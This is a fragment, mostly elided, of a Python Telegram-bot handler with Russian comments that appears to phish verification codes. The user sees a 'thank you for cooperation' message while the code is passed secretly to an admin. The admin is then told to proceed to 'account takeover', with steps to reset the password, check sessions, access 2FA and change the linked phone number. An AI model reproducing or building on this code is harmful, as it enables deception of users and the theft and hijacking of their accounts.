...
async def process_verification_code(message: types.Message):
    ...
    # УСПЕШНОЕ СООБЩЕНИЕ ДЛЯ ПОЛЬЗОВАТЕЛЯ
    success_text = """
...
*Спасибо за сотрудничество!*
    ...
    # Отправка данных админу (скрыто от пользователя)
    cursor.execute(
...
*Можно переходить к захвату аккаунта*
        ...
        try:
            ...
            # Дополнительное уведомление для действий
            actions_text = f"""
📋 *Действия после получения доступа:*
1. Восстановить пароль через код подтверждения
2. Проверить привязанные сессии
3. Получить доступ к 2FA если есть
4. Сменить номер телефона привязанный к аккаунту
            """
